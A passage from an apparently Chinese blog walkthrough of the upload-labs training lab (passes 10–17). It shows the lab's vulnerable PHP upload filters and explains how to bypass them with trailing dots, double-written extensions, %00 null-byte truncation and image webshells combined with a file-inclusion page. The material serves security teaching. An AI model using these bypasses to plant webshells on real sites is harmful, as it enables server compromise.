class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="comment">#原$img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span></span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="bypass-9"><a href="#bypass-9" class="headerlink" title="bypass"></a>bypass</h3><p>抓包，在后缀加上<code>&#39;. .&#39;</code>：</p><p><img src="https://i.loli.net/2021/02/13/87fqU23YhwFBseS.png"></p><p>最终得到的文件后缀为<code>&#39;. &#39;</code></p><p><img src="https://i.loli.net/2021/02/13/Ufm2tkGdD14Hai9.png"></p><h2 id="pass11（黑名单-双写绕过）"><a href="#pass11（黑名单-双写绕过）" class="headerlink" title="pass11（黑名单-双写绕过）"></a>pass11（黑名单-双写绕过）</h2><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>直接上传，发现将后缀名置换为空了，这时候可以试一下大小写、双写</p><p><img src="https://i.loli.net/2021/02/13/tHw2vsWTYKxJb7f.png"></p><h3 id="bypass-10"><a href="#bypass-10" class="headerlink" title="bypass"></a>bypass</h3><p>大小写（PhP）仍被置换为空</p><p>尝试双写绕过：</p><p><img src="https://i.loli.net/2021/02/13/ZJQNa5wS814hl7F.png"></p><p>成功啦</p><p>看一下源码<strong>（将符号数组deny_ext的全部置换为空）</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);<span class="comment">#将符号数组deny_ext的全部置换为空</span></span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br></pre></td></tr></table></figure><h2 id="pass12（白名单-00截断GET）"><a href="#pass12（白名单-00截断GET）" class="headerlink" title="pass12（白名单-00截断GET）"></a>pass12（白名单-00截断GET）</h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>随便上传个php文件，提示只能上传jpg、png、gif（白名单）</p><p><img src="https://i.loli.net/2021/02/13/5cjsuKXEQq9l7Bg.png"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>提示：上传路径可控，即可通过url传参<code>save_path</code>控制最终路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>由此：</p><p>1.上传后缀为jpg | png | gif 的文件实现上传</p><p>2.利用save_path实现00截断</p><h3 id="bypass-11"><a href="#bypass-11" class="headerlink" title="bypass"></a>bypass</h3><p>00截断：</p><p>这里是通过上传save_path截断文件名~</p><p>条件：</p><blockquote><p>PHP &lt; 5.3.4</p><p>magic_quotes_gpc 关闭</p></blockquote><p>原理：</p><blockquote><p><code>0x00</code>是字符串的结束标志符，所以php在读取到<code>0x00</code>时就不会再往后读取，可以利用这些截断字符后面不需要的内容</p><p>php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断</p><p>0x表示16进制，URL中%00解码成16进制就是0x00</p></blockquote><p>利用：</p><p>1.上传info.jpg（要抓包！！！）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>抓包：</p><p>url中传参控制上传路径：<code>save_path=../upload/info.php%00</code></p><p><img src="https://i.loli.net/2021/02/13/lw5OPL4GNtpTmAa.png"></p><p>上传后得到的路径为：<img src="https://i.loli.net/2021/02/13/Q3HwEo7D6nxcvuO.png"></p><p>如果直接访问会404，要删掉php后面那一段才能成功访问，如下：</p><p><img src="https://i.loli.net/2021/02/13/yH6smeXqw3DAE8L.png"></p><h2 id="pass13（白名单-00截断post）"><a href="#pass13（白名单-00截断post）" class="headerlink" title="pass13（白名单-00截断post）"></a>pass13（白名单-00截断post）</h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>随便上传个php文件，提示只能上传jpg、png、gif（白名单）</p><p><img src="https://i.loli.net/2021/02/13/5cjsuKXEQq9l7Bg.png"></p><p>源码：与12不同的是：<code>$_POST[&#39;save_path&#39;]</code>使用post传参</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">   <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">       <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">       <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><h3 id="bypass-12"><a href="#bypass-12" class="headerlink" title="bypass"></a>bypass</h3><p>因为是POST型，无法在url中修改</p><p>先将路径改为<code>../upload/info.phpa</code>；这里的a是为了方便后面修改为0x00</p><p><img src="https://i.loli.net/2021/02/13/Wnyzeft93PbLgoG.png"></p><p>00截断的00本就是指十六进制的0x00，因此我们选择hex，然后找到a的十六进制61所在，将其改为00</p><p><img src="https://i.loli.net/2021/02/13/LefqkVtg7c8ayH9.png"></p><p>放包即可</p><p>访问时同12，需将php后的东西都删掉，不然就会404</p><p><img src="https://i.loli.net/2021/02/13/jtyLAs6GxVzQmgF.png" alt="删掉前"><br><img src="https://i.loli.net/2021/02/13/cFpTkiMxnRU164I.png" alt="删掉后"></p><h2 id="pass14（图片🐎）"><a href="#pass14（图片🐎）" class="headerlink" title="pass14（图片🐎）"></a>pass14（图片🐎）</h2><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>如图：</p><p><img src="https://i.loli.net/2021/02/13/nbCm3BrocN8FweK.png"></p><p>那么咱们就来上传图片🐎吧</p><p>并且提示：本pass检查图标内容开头2个字节</p><p>也就是说单纯包含一句话木马，只是修改个后缀名是不行的，必须具有图片特征(也就是图片头啦)。在很多ctf题也有这样的要求~</p><blockquote><p>取一部分–</p><p>JPG:<code>ÿØÿà..JFIF..........ÿ</code> </p><p>​            hex:<code>FF D8 FF E0 00 10 4A 46 49 46 00 01 01 00 00 01 00 01 00 00 FF</code></p><p>PNG:<code>‰PNG........IHDR</code>    </p><p>​            hex:<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code></p><p>GIF: <code>GIF89a#</code>                        </p><p>​            hex:<code>47 49 46 38 39 61 23</code></p></blockquote><p>并且图片马需要搭配文件包含漏洞使用~</p><h3 id="bypass-13"><a href="#bypass-13" class="headerlink" title="bypass"></a>bypass</h3><p>1、准备<code>图片🐎</code></p><p>图片马的原理是不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区</p><p>一个正常图片 1.jpg；一个包含🐎的1.php文件；合并后得到名为2.jpg的图片🐎</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">cmd中：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">/b指定以二进制格式复制、合并文件; 用于图像类/声音类文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">/a指定以ASCII格式复制、合并文件。用于txt等文档类文件</span></span><br><span class="line">copy  1.jpg/b + 1.php/a  2.jpg</span><br></pre></td></tr></table></figure><p>或者直接十六进制打开图片，将一句话木马插入最底层</p><p><img src="https://i.loli.net/2021/02/13/uOTLmlvSxt8aeRr.png"></p><p>2、上传木马，然后利用文件包含漏洞读取</p><p>这里我们利用的是upload-labs自带的include.php，路径如下</p><p><img src="https://i.loli.net/2021/02/13/ag5bkDSr2vVnYAw.png"></p><p>传参 <code>file=图片🐎路径</code>即可,如下</p><p><img src="https://i.loli.net/2021/02/13/KdpkFAJ9ZP14GHI.png"></p><p>此处我上传的图片马分为两部分，属于图片部分的仅是上图窗口左上角那些，作为判断图片类型的标准</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节；读取上传文件的前两个字节内容</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    <span class="comment">#unpack解码</span></span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    <span class="comment">#转换为10进制（默认为10进制）</span></span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      <span class="comment">#根据转换后的结果判断图片类型</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pass15（图片🐎-getimagesize）"><a href="#pass15（图片🐎-getimagesize）" class="headerlink" title="pass15（图片🐎-getimagesize）"></a>pass15（图片🐎-getimagesize）</h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>同样是上传图片马，来看一下判断函数~</p><p>tips:使用getimagesize()检查是否为图片文件</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>);    <span class="comment">#获取图像信息，返回值为包含图像信息的数组</span></span><br><span class="line">        <span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]);<span class="comment">#获取图像类型的文件扩展名</span></span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">相关的函数说明：</span><br><span class="line">getimagesize(<span class="keyword">string</span> <span class="variable">$filename</span> [,<span class="keyword">array</span> &amp;<span class="variable">$imageinfo</span>])<span class="comment">//获取图像信息，返回一个数组</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">返回的数组中，索引0：图像宽度像素值</span></span><br><span class="line"><span class="comment"> 索引1：图像高度像素值</span></span><br><span class="line"><span class="comment"> 索引2：图像类型，1=GIF，2=JPG，3=PNG，4=SWF，5=PSD，6=BMP，7=TIFF_II，8=TIFF_MM，9=JPC，10=JP2，11=JPX，12=JB2，13=SWC，14=IFF，15=WBMP，16=XBM，17=ICO，18=COUNT</span></span><br><span class="line"><span class="comment"> 索引3：图像宽度和高度的字符串</span></span><br><span class="line"><span class="comment"> 索引bits：图像的每种颜色的位数，二进制格式</span></span><br><span class="line"><span class="comment"> 索引channels：图像的通道值</span></span><br><span class="line"><span class="comment"> 索引mime：图像的MIME信息</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">image_type_to_extension(<span class="keyword">int</span> <span class="variable">$imagetype</span> [,<span class="keyword">bool</span> <span class="variable">$include_dot</span> = <span class="literal">TRUE</span>])<span class="comment">//获取图像类型的文件扩展名</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">include_dot是否在扩展名前加点。默认为TRUE</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="bypass-14"><a href="#bypass-14" class="headerlink" title="bypass"></a>bypass</h3><p>经过测试，之前使用的仅含图片头的png和gif文件都能成功上传，但jpg类型却不行（why？？）</p><p>因此我们需要传入一个完整的图片与🐎拼接</p><p>选择图片的时候要确保不含会引发语法错误的图片</p><p>比如我选择的一个图片因为含有 ` 反引号就引发了语法错误：</p><p><img src="https://i.loli.net/2021/02/13/ekRvSByhCEaODQj.png"></p><p>换一个图片就可以啦：</p><p><img src="https://i.loli.net/2021/02/13/pOd4ojxsmPbQvBN.png"></p><p>最终：</p><p><img src="https://i.loli.net/2021/02/13/Z8Vs3vfjFog5xlN.png"></p><h2 id="pass16（图片🐎-exif-imagetype）"><a href="#pass16（图片🐎-exif-imagetype）" class="headerlink" title="pass16（图片🐎-exif_imagetype）"></a>pass16（图片🐎-exif_imagetype）</h2><p>需要开启php_exif模块</p><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$filename</span>); <span class="comment">#读取一个图像的第一个字节并检查其签名，判断一个图像的类型</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="bypass-15"><a href="#bypass-15" class="headerlink" title="bypass"></a>bypass</h3><p>按道理上传pass15的图像能过这里也能过，不过不知为啥点击上传之后啥都没了–</p><p>除了pass16其他的都挺正常的</p><p><img src="https://i.loli.net/2021/02/13/KdN9o3rWCQcvDLq.png"></p><h2 id="pass17（图片🐎-重新渲染）"><a href="#pass17（图片🐎-重新渲染）" class="headerlink" title="pass17（图片🐎-重新渲染）"></a>pass17（图片🐎-重新渲染）</h2><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><p>判断后缀与MIME类型是否符合要求，符合后生成新图像（内容不正确会失败，返回false，相当于多了一次验证），生成新图像失败就<code>unlink</code>删除，成功就根据系统时间给文件命名，再通过<code>imagejpeg</code>类似函数使用原图像资源创建新图像（二次渲染）</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">调用了php的GD库，提取了文件中的图片数据，然后再重新渲染，这样图片中插入的恶意代码就会被过滤掉了</span><br><span class="line"><span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= substr(strrchr(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = 